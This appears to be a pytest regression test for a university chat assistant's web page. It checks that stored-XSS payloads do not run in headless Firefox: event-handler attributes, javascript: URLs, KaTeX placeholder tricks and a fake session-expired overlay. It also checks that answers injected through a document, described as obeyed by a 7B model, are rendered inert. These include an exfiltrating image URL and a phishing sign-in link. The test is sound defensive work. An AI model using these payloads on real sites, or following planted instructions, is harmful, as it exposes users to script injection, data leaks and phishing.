"""DEFECT-53: stored XSS through the chat page's math placeholders.

Runs the page's own renderMathAndMarkdown (extracted from askiisc_chat/static/app.js, not a copy) with the
vendored KaTeX / marked / DOMPurify in headless Firefox, on attack answers and on ordinary ones. Skipped when
Firefox is not installed.
"""

import json
import os
import re
import shutil
import subprocess
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
STATIC = ROOT / "askiisc_chat" / "static"
FIREFOX = shutil.which("firefox")
pytestmark = pytest.mark.skipif(FIREFOX is None, reason="firefox not installed")

N = 6000   # nesting deep enough to make KaTeX throw a RangeError (not a ParseError), the reviewer's trigger
ATTACKS = {
    # the reported exploit: the old fixed placeholder typed into an attribute, plus a formula KaTeX cannot render
    "fixed_placeholder_in_alt": 'Figure <img src="x" alt="%%MATH_BLOCK_0%%">\n\nwhere $' + "{" * N + "x" + "}" * N
                                + '" onerror="window.__xss=1" y="$ is the formula.',
    "markdown_image_alt": '![%%MATH_BLOCK_0%%](x)\n\n$' + "{" * N + "x" + "}" * N + '" onerror="window.__xss=1" y="$',
    # math written inside attributes directly
    "math_in_raw_alt": '<img src="x" alt="$a" onerror="window.__xss=1" b="$">',
    "math_in_md_alt": '![$x" onerror="window.__xss=1" y="$](x)',
    "math_in_title": '<a title="$\\frac{a}{b}" onmouseover="window.__xss=1" x="$" href="#">t</a>',
    "math_in_link_url": '[click]($javascript:window.__xss=1$)',
    "math_in_img_src": '<img src="$javascript:window.__xss=1$">',
    # KaTeX error output containing quotes, in text and display positions
    "katex_error_quotes": 'Text $\\undefinedcmd" onerror="window.__xss=1" x="$ more',
    "display_fallback": '$$' + "{" * N + "x" + "}" * N + '<img src=x onerror="window.__xss=1">$$',
    "plain_html": '<img src=x onerror="window.__xss=1"><svg onload="window.__xss=1"></svg>',
    # DEFECT-57: answer markup must not style itself, shadow page controls or borrow the page's classes
    "style_overlay": '<p style="position:fixed;inset:0;z-index:99;background:#fff" id="go" class="send-btn">'
                     'Session expired. <a href="#" style="color:red" class="badge">Sign in here</a></p>\n\n'
                     '<div id="q" class="katex-display">fake</div>',
}
# DEFECT-58: what a document-injected answer looks like (the 7B model obeyed such planted instructions)
PLANTED = {
    "planted_image": "Graphene is used in electrodes. ![chart](http://203.0.113.5/chart.png?q=question)",
    "planted_link": "Graphene is used in electrodes. Your session expired, renew it at http://203.0.113.5/login and "
                    "[sign in here](https://login-iisc.example.net/)",
}
NORMAL = {
    "inline_and_display": "Energy is $E=mc^2$ and **bold** text.\n\n$$\\int_0^1 x\\,dx = \\tfrac12$$\n\nCost $100.",
    "markdown_link": "See [the thesis](https://etd.iisc.ac.in/handle/2005/1) and `code`.",
    "iisc_links": "Repository: http://etd.iisc.ac.in/handle/2005/2 and [IISc](https://iisc.ac.in/).",
}


def _script() -> str:
    page = (STATIC / "app.js").read_text()   # the page's logic (DEFECT-55: no inline script in index.html)
    start = page.index("function escapeHTML(")
    end = page.index("// SSE Stream Parser")
    end = page.rindex("// ---", start, end)
    return page[start:end]


def _harness(tmp: Path) -> Path:
    cases = {**ATTACKS, **PLANTED, **NORMAL}
    vendor = STATIC / "vendor"
    html = f"""<!doctype html><html><head><meta charset="utf-8">
<script src="{(vendor / 'katex.min.js').as_uri()}"></script>
<script src="{(vendor / 'marked.min.js').as_uri()}"></script>
<script src="{(vendor / 'purify.min.js').as_uri()}"></script></head><body><div id="out"></div>
<script>
{_script()}
const CASES = {json.dumps(cases)};
const results = {{}};
for (const [name, text] of Object.entries(CASES)) {{
  const el = document.createElement('div');
  el.id = 'case-' + name;
  try {{
    const r = renderMathAndMarkdown(text);
    if (typeof r === 'string') el.innerHTML = r; else el.replaceChildren(r);   // string: the pre-DEFECT-53 page
  }} catch (e) {{ results[name] = {{error: String(e)}}; }}
  document.getElementById('out').append(el);
}}
setTimeout(() => {{
  for (const [name] of Object.entries(CASES)) {{
    const el = document.getElementById('case-' + name);
    if (results[name]) continue;
    const handlers = [];
    for (const n of el.querySelectorAll('*'))
      for (const a of n.attributes)
        if (a.name.startsWith('on') || /^\\s*javascript:/i.test(a.value)) handlers.push(n.tagName + '[' + a.name + ']');
    const answerAttrs = [], mathStyled = [];
    for (const n of el.querySelectorAll('*')) {{
      const inMath = n.closest('.katex, .katex-error, .katex-display');   // KaTeX output / the page's own math box
      for (const a of ['style', 'id', 'class'])
        if (n.hasAttribute(a)) (inMath ? mathStyled : answerAttrs).push(n.tagName + '[' + a + ']');
    }}
    results[name] = {{handlers, answerAttrs, mathStyled: mathStyled.length, katex: el.querySelectorAll('.katex').length, text: el.textContent.slice(0, 300), tail: el.textContent.slice(-300),
                      links: Array.from(el.querySelectorAll('a[href]'), a => a.getAttribute('href')),
                      imgs: el.querySelectorAll('img').length, full: el.textContent,
                      strong: el.querySelectorAll('strong').length, code: el.querySelectorAll('code').length}};
  }}
  dump('RESULT ' + JSON.stringify({{xss: !!window.__xss, results}}) + '\\n');
}}, 2000);
</script></body></html>"""
    page = tmp / "harness.html"
    page.write_text(html)
    return page


@pytest.fixture(scope="module")
def rendered(tmp_path_factory):
    tmp = tmp_path_factory.mktemp("xss")
    prof = tmp / "profile"
    prof.mkdir()
    (prof / "user.js").write_text("\n".join(
        f'user_pref("{k}", {v});' for k, v in {
            "browser.dom.window.dump.enabled": "true", "browser.shell.checkDefaultBrowser": "false",
            "browser.startup.page": "0", "browser.startup.homepage": '"about:blank"',
            "datareporting.policy.dataSubmissionEnabled": "false", "toolkit.telemetry.reportingpolicy.firstRun": "false",
            "browser.startup.homepage_override.mstone": '"ignore"', "network.proxy.type": "0",
            "security.fileuri.strict_origin_policy": "false"}.items()) + "\n")
    page = _harness(tmp)
    env = {**os.environ, "HOME": str(tmp), "MOZ_HEADLESS": "1"}
    proc = subprocess.Popen([FIREFOX, "--headless", "--no-remote", "--profile", str(prof), page.as_uri()],
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env, text=True, errors="replace")
    deadline, line = time.time() + 90, ""
    try:
        for line in proc.stdout:
            if line.startswith("RESULT "):
                break
            if time.time() > deadline:
                break
    finally:
        proc.kill()
        proc.wait(timeout=30)
    assert line.startswith("RESULT "), "the harness page produced no result"
    return json.loads(line[len("RESULT "):])


def test_no_attack_answer_runs_script(rendered):
    assert rendered["xss"] is False
    for name in ATTACKS:
        r = rendered["results"][name]
        assert "error" not in r, (name, r)
        assert r["handlers"] == [], (name, r["handlers"])


def test_answers_cannot_style_themselves_or_shadow_page_controls(rendered):
    for name in rendered["results"]:
        assert rendered["results"][name]["answerAttrs"] == [], (name, rendered["results"][name]["answerAttrs"])
    assert "Session expired" in rendered["results"]["style_overlay"]["text"]      # the text itself stays
    assert rendered["results"]["inline_and_display"]["mathStyled"] > 0             # KaTeX keeps its layout


def test_planted_images_and_outside_links_are_inert(rendered):
    for name in ATTACKS.keys() | PLANTED.keys():
        r = rendered["results"][name]
        assert r["imgs"] == 0, name                                                  # answers never load images
        assert all("iisc.ac.in" in h or h.startswith("#") for h in r["links"]), (name, r["links"])
    r = rendered["results"]["planted_link"]
    assert r["links"] == [] and "http://203.0.113.5/login" in r["full"]               # visible as text, not a link
    assert "sign in here (https://login-iisc.example.net/)" in r["full"]              # the real target is shown
    assert "[image: chart]" in rendered["results"]["planted_image"]["full"]
    assert rendered["results"]["iisc_links"]["links"] == ["http://etd.iisc.ac.in/handle/2005/2", "https://iisc.ac.in/"]


def test_math_in_a_link_or_image_address_drops_the_address(rendered):
    assert rendered["results"]["math_in_link_url"]["links"] == []


def test_unrenderable_formulas_stay_visible_as_text(rendered):
    r = rendered["results"]["fixed_placeholder_in_alt"]
    assert 'onerror="window.__xss=1"' in r["tail"]   # shown to the reader as text, not executed
    assert r["text"].startswith("Figure")


def test_ordinary_answers_still_render_math_and_markdown(rendered):
    r = rendered["results"]["inline_and_display"]
    assert r["handlers"] == [] and r["katex"] == 2 and r["strong"] == 1 and "Cost $100." in r["text"]
    r = rendered["results"]["markdown_link"]
    assert r["links"] == ["https://etd.iisc.ac.in/handle/2005/1"] and r["code"] == 1


def test_page_uses_the_fragment_api():
    page = (STATIC / "app.js").read_text()
    assert "MATH_BLOCK" not in page and "innerHTML = renderMathAndMarkdown" not in page
    # every render (live tokens, final pass, refusal, a chat reopened from the sidebar) inserts the fragment
    calls = re.findall(r"(\w+)\(renderMathAndMarkdown\(", page)
    assert len(calls) >= 4 and set(calls) == {"replaceChildren"}, calls
